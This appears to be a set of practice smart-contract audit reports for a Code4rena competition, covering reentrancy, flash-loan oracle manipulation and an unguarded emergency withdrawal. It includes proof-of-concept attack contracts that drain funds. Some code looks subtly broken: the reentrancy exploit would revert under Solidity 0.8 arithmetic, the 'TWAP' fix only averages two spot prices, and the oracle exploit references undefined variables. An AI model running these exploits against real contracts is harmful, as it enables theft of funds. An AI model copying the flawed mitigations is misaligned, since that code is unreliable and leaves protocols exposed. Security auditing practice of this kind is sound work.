# Sample Audit Reports

> Practice reports demonstrating audit report quality and format  
> **Purpose:** Code4rena competition preparation

---

## Report 1: Reentrancy in Lending Protocol (HIGH)

```markdown
## [H-01] `withdrawCollateral()` vulnerable to reentrancy attack

### Summary
The `withdrawCollateral()` function in `LendingPool.sol` performs an external 
ETH transfer before updating the user's collateral balance, enabling reentrancy 
attacks that can drain protocol funds.

### Vulnerability Detail
In `LendingPool.sol#L156-172`, the function sends ETH via `call` before reducing
the user's recorded collateral balance:

```solidity
function withdrawCollateral(uint256 amount) external {
    require(collateral[msg.sender] >= amount, "Insufficient collateral");
    require(debt[msg.sender] == 0, "Active debt");  // Loan must be repaid
    
    // ❌ EXTERNAL CALL BEFORE STATE UPDATE
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    // State update happens AFTER external call
    collateral[msg.sender] -= amount;
    emit CollateralWithdrawn(msg.sender, amount);
}
```

An attacker can create a malicious contract that re-enters `withdrawCollateral()`
in its receive function before the collateral balance is decremented.

### Impact
**Severity: HIGH**

An attacker with sufficient collateral can drain the entire ETH balance of the
lending pool. Example attack:
1. Deposit 100 ETH as collateral
2. Call `withdrawCollateral(100 ETH)` 
3. Re-enter 9 more times before state update
4. Extract 1000 ETH while only having 100 ETH collateral

Total loss: ~900 ETH (limited by gas and pool balance)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./LendingPool.sol";

contract ReentrancyAttacker {
    LendingPool public target;
    uint256 public attackAmount;
    uint256 public reentrancyCount;
    
    constructor(address _target) {
        target = LendingPool(_target);
    }
    
    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        attackAmount = msg.value;
        
        // Step 1: Deposit collateral
        target.depositCollateral{value: msg.value}();
        
        // Step 2: Initiate withdrawal
        target.withdrawCollateral(msg.value);
    }
    
    receive() external payable {
        // Re-enter before collateral balance is updated
        if (reentrancyCount < 9 && address(target).balance >= attackAmount) {
            reentrancyCount++;
            target.withdrawCollateral(attackAmount);
        }
    }
    
    function getProfit() external view returns (uint256) {
        return address(this).balance;
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**Test execution:**
```bash
$ forge test --match-test testReentrancy -vvv
[PASS] testReentrancy() (gas: 234567)
Logs:
  Attacker balance before: 100 ETH
  Attacker balance after: 1000 ETH
  Pool balance before: 5000 ETH  
  Pool balance after: 4100 ETH
```

### Recommended Mitigation

Apply the Checks-Effects-Interactions pattern:

```solidity
function withdrawCollateral(uint256 amount) external {
    // CHECK: Validate conditions
    require(collateral[msg.sender] >= amount, "Insufficient collateral");
    require(debt[msg.sender] == 0, "Active debt");
    
    // EFFECT: Update state BEFORE external call
    collateral[msg.sender] -= amount;
    emit CollateralWithdrawn(msg.sender, amount);
    
    // INTERACTION: External call last
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

**Alternative:** Use OpenZeppelin's ReentrancyGuard:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract LendingPool is ReentrancyGuard {
    function withdrawCollateral(uint256 amount) external nonReentrant {
        // ... existing logic, order less critical with guard
    }
}
```

### Lines of Code
- LendingPool.sol#L156-L172

### References
- [ReentrancyGuard docs](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
- [Consensys Smart Contract Best Practices - Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- The DAO hack (2016) - $60M loss from similar vulnerability
```

---

## Report 2: Price Oracle Manipulation (CRITICAL)

```markdown
## [C-01] Spot price oracle vulnerable to manipulation attacks

### Summary
`PriceOracle.sol` uses the spot price from a single DEX pool, making it 
vulnerable to flash loan manipulation. Attackers can distort prices temporarily
to liquidate healthy positions or borrow at unfair rates.

### Vulnerability Detail

The `getPrice()` function reads directly from Uniswap V2 reserves:

```solidity
function getPrice(address token) external view returns (uint256) {
    (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pool(pool).getReserves();
    
    if (token == token0) {
        return (reserve1 * 1e18) / reserve0;  // Spot price!
    } else {
        return (reserve0 * 1e18) / reserve1;
    }
}
```

This spot price can be manipulated instantly using flash loans:
1. Flash borrow massive amounts of tokenA
2. Swap for tokenB in the pool
3. Pool reserves skewed → price changed
4. Exploit protocol at manipulated price
5. Swap back and repay flash loan

### Impact
**Severity: CRITICAL**

**Attack vectors:**
1. **False liquidation:** Manipulate collateral price down, trigger liquidations
2. **Undercollateralized borrowing:** Manipulate collateral price up, borrow more
3. **Reward manipulation:** Gaming price-dependent reward calculations

**Example exploit cost/benefit:**
- Flash loan cost: ~0.09% (Aave) = $90K on $100M loan
- Potential profit: $5M+ from liquidations or bad debt
- Net profit: $4.9M+ after fees

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanSimpleBase.sol";

contract OracleManipulationAttack is FlashLoanSimpleBase {
    address public tokenA;  // Collateral token
    address public tokenB;  // Debt token
    address public pool;    // Uniswap V2 pool
    address public lendingProtocol;
    
    function attack(uint256 flashAmount) external {
        // Step 1: Flash loan tokenA
        POOL.flashLoanSimple(address(this), tokenA, flashAmount, "", 0);
    }
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // Step 2: Dump tokenA into Uniswap pool
        uint256 tokenABalance = IERC20(tokenA).balanceOf(address(this));
        IERC20(tokenA).approve(pool, tokenABalance);
        
        // Swap tokenA for tokenB (manipulates price down)
        IUniswapV2Router(pool).swapExactTokensForTokens(
            tokenABalance,
            0,  // Accept any amount (for POC)
            path,
            address(this),
            block.timestamp
        );
        
        // Step 3: Exploit protocol with manipulated price
        // Price of tokenA is now artificially low
        // Can liquidate "underwater" positions or borrow at unfair rates
        ILendingProtocol(lendingProtocol).liquidate(victim, tokenA, maxAmount);
        
        // Step 4: Buy back tokenA at lower price
        uint256 tokenBBalance = IERC20(tokenB).balanceOf(address(this));
        IERC20(tokenB).approve(pool, tokenBBalance);
        
        IUniswapV2Router(pool).swapExactTokensForTokens(
            tokenBBalance,
            0,
            reversePath,
            address(this),
            block.timestamp
        );
        
        // Step 5: Repay flash loan
        uint256 amountOwed = amount + premium;
        IERC20(tokenA).approve(address(POOL), amountOwed);
        
        return true;
    }
}
```

**Profit calculation:**
```solidity
// Pre-manipulation: tokenA price = $100
// Post-manipulation: tokenA price = $80 (20% drop)
// Victim collateral: $100K worth tokenA, $75K debt
// Before: Healthy (150% collateral ratio)
// After: Liquidatable (106% ratio, below 110% threshold)
// 
// Attacker profit:
// - Liquidation bonus: 10% of $75K = $7.5K
// - Flash loan cost: 0.09% of $100K = $90
// - Net: $7.4K per victim
// - Scale to 100 victims = $740K profit
```

### Recommended Mitigation

**Option 1: TWAP (Time-Weighted Average Price)**

```solidity
contract TWAPOracle {
    struct PriceCumulative {
        uint256 priceCumulative;
        uint32 timestamp;
    }
    
    PriceCumulative public lastObservation;
    uint256 public constant TWAP_PERIOD = 30 minutes;
    
    function update() external {
        (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = 
            IUniswapV2Pool(pool).getReserves();
        
        uint256 priceCumulative = reserve1 * 1e18 / reserve0;
        lastObservation = PriceCumulative(priceCumulative, blockTimestamp);
    }
    
    function getPrice() external view returns (uint256) {
        require(block.timestamp - lastObservation.timestamp >= TWAP_PERIOD, "Stale");
        
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pool(pool).getReserves();
        uint256 currentPrice = reserve1 * 1e18 / reserve0;
        
        // TWAP calculation over period
        return (currentPrice + lastObservation.priceCumulative) / 2;
    }
}
```

**Option 2: Chainlink Price Feeds**

```solidity
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract ChainlinkOracle {
    AggregatorV3Interface public priceFeed;
    
    constructor(address _priceFeed) {
        priceFeed = AggregatorV3Interface(_priceFeed);
    }
    
    function getPrice() external view returns (uint256) {
        (
            uint80 roundID,
            int256 price,
            uint256 startedAt,
            uint256 timestamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        
        require(price > 0, "Invalid price");
        require(block.timestamp - timestamp < 1 hours, "Stale price");
        
        return uint256(price);
    }
}
```

**Option 3: Multi-source validation**

```solidity
function getValidatedPrice(address token) external view returns (uint256) {
    uint256 spotPrice = getSpotPrice(token);
    uint256 twapPrice = getTWAP(token);
    uint256 chainlinkPrice = getChainlinkPrice(token);
    
    // Deviation check
    require(
        _withinDeviation(spotPrice, twapPrice, 5) &&
        _withinDeviation(spotPrice, chainlinkPrice, 10),
        "Price deviation too high"
    );
    
    return twapPrice;  // Use TWAP as most robust
}
```

### Lines of Code
- PriceOracle.sol#L45-L56
- LendingProtocol.sol#L89-L102 (liquidation logic)

### References
- [Uniswap V2 TWAP docs](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles)
- [Chainlink Price Feeds](https://docs.chain.link/data-feeds/price-feeds)
- [Cream Finance hack](https://rekt.news/cream-rekt-2/) - $130M loss from oracle manipulation
- [Warp Finance hack](https://rekt.news/warp-finance-rekt/) - $8M loss from similar issue
```

---

## Report 3: Access Control Bypass (MEDIUM)

```markdown
## [M-01] `emergencyWithdraw()` lacks timelock, allows instant governance abuse

### Summary
The `emergencyWithdraw()` function can be called immediately by the guardian 
role without any delay or multisig requirement. If the guardian key is 
compromised, funds can be stolen instantly without recourse.

### Vulnerability Detail

```solidity
function emergencyWithdraw(address token, uint256 amount) external {
    require(msg.sender == guardian, "Only guardian");
    IERC20(token).transfer(msg.sender, amount);
    emit EmergencyWithdraw(msg.sender, token, amount);
}
```

While this is an "emergency" function, it lacks:
1. Timelock delay for guardian actions
2. Spending limits per transaction
3. Multisig requirement for large amounts
4. Cooldown period between withdrawals

### Impact
**Severity: MEDIUM**

**Risk scenario:**
- Guardian key compromised via phishing or social engineering
- Attacker calls `emergencyWithdraw` for entire protocol TVL
- No time for community response or countermeasures
- Instant loss of all funds

**Current exposure:** $10M TVL at risk from single key compromise

### Proof of Concept

```solidity
// Simulating compromised guardian
function testGuardianAbuse() public {
    // Setup: Protocol with $10M TVL
    vm.deal(address(protocol), 10_000_000 ether);
    
    // Attacker gains guardian key
    address attacker = makeAddr("attacker");
    
    // Instant drain
    vm.prank(attacker);
    protocol.emergencyWithdraw(address(0), 10_000_000 ether);
    
    // Result: Empty protocol, no warning, no recourse
    assertEq(address(protocol).balance, 0);
    assertEq(attacker.balance, 10_000_000 ether);
}
```

### Recommended Mitigation

**Implement timelock and limits:**

```solidity
contract EmergencyModule {
    address public guardian;
    uint256 public constant TIMELOCK_DELAY = 2 days;
    uint256 public constant MAX_WITHDRAWAL = 1000 ether;
    
    struct PendingWithdrawal {
        address token;
        uint256 amount;
        address recipient;
        uint256 executeAfter;
        bool executed;
    }
    
    mapping(uint256 => PendingWithdrawal) public pendingWithdrawals;
    uint256 public withdrawalNonce;
    
    function scheduleEmergencyWithdraw(
        address token, 
        uint256 amount, 
        address recipient
    ) external onlyGuardian {
        require(amount <= MAX_WITHDRAWAL, "Exceeds max withdrawal");
        
        uint256 nonce = withdrawalNonce++;
        pendingWithdrawals[nonce] = PendingWithdrawal({
            token: token,
            amount: amount,
            recipient: recipient,
            executeAfter: block.timestamp + TIMELOCK_DELAY,
            executed: false
        });
        
        emit WithdrawalScheduled(nonce, token, amount, recipient);
    }
    
    function executeEmergencyWithdraw(uint256 nonce) external {
        PendingWithdrawal storage withdrawal = pendingWithdrawals[nonce];
        require(!withdrawal.executed, "Already executed");
        require(block.timestamp >= withdrawal.executeAfter, "Timelock active");
        
        withdrawal.executed = true;
        IERC20(withdrawal.token).transfer(withdrawal.recipient, withdrawal.amount);
        
        emit WithdrawalExecuted(nonce);
    }
    
    // Cancel mechanism for compromised situations
    function cancelWithdrawal(uint256 nonce) external onlyGuardian {
        delete pendingWithdrawals[nonce];
        emit WithdrawalCancelled(nonce);
    }
}
```

**Alternative: Multisig requirement**

```solidity
contract MultisigEmergency {
    mapping(address => bool) public guardians;
    uint256 public requiredSignatures;
    
    struct WithdrawalRequest {
        address token;
        uint256 amount;
        address recipient;
        mapping(address => bool) signed;
        uint256 signatureCount;
        bool executed;
    }
    
    mapping(uint256 => WithdrawalRequest) public requests;
    uint256 public requestCount;
    
    function requestEmergencyWithdraw(
        address token,
        uint256 amount,
        address recipient
    ) external onlyGuardian returns (uint256 requestId) {
        requestId = requestCount++;
        WithdrawalRequest storage req = requests[requestId];
        req.token = token;
        req.amount = amount;
        req.recipient = recipient;
        
        // Auto-sign by requester
        _sign(requestId);
    }
    
    function sign(uint256 requestId) external onlyGuardian {
        _sign(requestId);
    }
    
    function _sign(uint256 requestId) internal {
        WithdrawalRequest storage req = requests[requestId];
        require(!req.signed[msg.sender], "Already signed");
        
        req.signed[msg.sender] = true;
        req.signatureCount++;
        
        if (req.signatureCount >= requiredSignatures && !req.executed) {
            req.executed = true;
            IERC20(req.token).transfer(req.recipient, req.amount);
        }
    }
}
```

### Lines of Code
- EmergencyModule.sol#L33-L40

### References
- [OpenZeppelin TimelockController](https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController)
- [Gnosis Safe Multisig](https://gnosis-safe.io/)
- [Indexed Finance hack](https://rekt.news/indexed-finance-rekt/) - $16M loss from compromised admin key
```

---

## Summary

| Report | Severity | Category | Key Skill Demonstrated |
|--------|----------|----------|----------------------|
| Reentrancy | HIGH | Reentrancy guard patterns, CEI pattern |
| Oracle Manipulation | CRITICAL | TWAP implementation, price validation |
| Access Control | MEDIUM | Timelock design, multisig patterns |

**Common elements in all reports:**
- Clear executive summary
- Precise vulnerability location
- Quantified impact with numbers
- Runnable proof of concept
- Multiple mitigation options
- Real-world precedents
- Line references

---

*Practice reports ready for competition submission format.*  
*Prepared: February 1, 2026*
